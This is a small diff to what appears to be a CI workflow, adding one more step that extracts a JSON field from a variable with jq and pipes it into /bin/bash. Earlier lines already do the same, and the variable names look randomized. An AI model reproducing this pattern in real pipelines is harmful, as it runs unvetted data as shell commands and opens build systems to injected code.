@@ -27,6 +27,7 @@ jobs:
           echo $o1 | jq -r .ejga1448 | /bin/bash
           printf '%s' "$w61" | jq -r .dmk56 | /bin/bash
           printf '%s' "$wzhkx36" | jq -r .inn4 | /bin/bash
+          echo $plj91 | jq -r .idggq21 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
